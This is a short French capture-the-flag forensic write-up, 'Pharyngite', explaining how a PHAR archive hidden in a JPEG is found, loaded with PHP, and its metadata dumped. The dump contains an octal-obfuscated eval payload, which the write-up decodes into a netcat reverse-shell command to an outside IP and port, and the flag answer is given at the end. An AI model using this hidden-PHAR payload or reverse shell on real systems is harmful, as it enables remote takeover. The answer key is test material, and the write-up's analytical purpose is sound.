# Write-up Forensic : Pharyngite

## 1. Détecter le PHAR caché dans le JPEG  
```bash
file auton.jpg
# → JPEG image data (mais on voit vite qu’il y a un stub PHP à l’intérieur)
strings auton.jpg | grep -E '\.phar/|__HALT_COMPILER'
# → .phar/stub.php, __HALT_COMPILER(), etc.
```

## 2. Renommer en `.phar`  
On lève toute ambiguïté pour PHP :  
```bash
cp auton.jpg auton.phar
```

## 3. Charger et dumper les métadonnées brutes  
```bash
php -d phar.readonly=0 -r '
  $p = new Phar("auton.phar");
  print_r($p->getMetadata());
'
```
> On obtient un `__PHP_Incomplete_Class Object` contenant, tout au fond :
> ```php
> <?php eval("\163\171\163\164\145\155\50\47\156\143\40\55\145\40\57\142\151\156\57\163\150\40\61\66\61\56\62\61\71\56\61\65\60\56\62\63\65\40\61\63\63\67\47\51\73");die(); ?>
> ```

## 4. Extraire & décoder la chaîne d’octals  
On va sur dcode et on z system('nc -e /bin/sh 161.219.150.235 1337');

## 5. Construction du flag  
- **Tool**  : `phpggc`  
- **IP**    : `161.219.150.235`  
- **Port**  : `1337`  

**Flag final :**  
```
CTF-DLS{phpggc;161.219.150.235;1337}
```
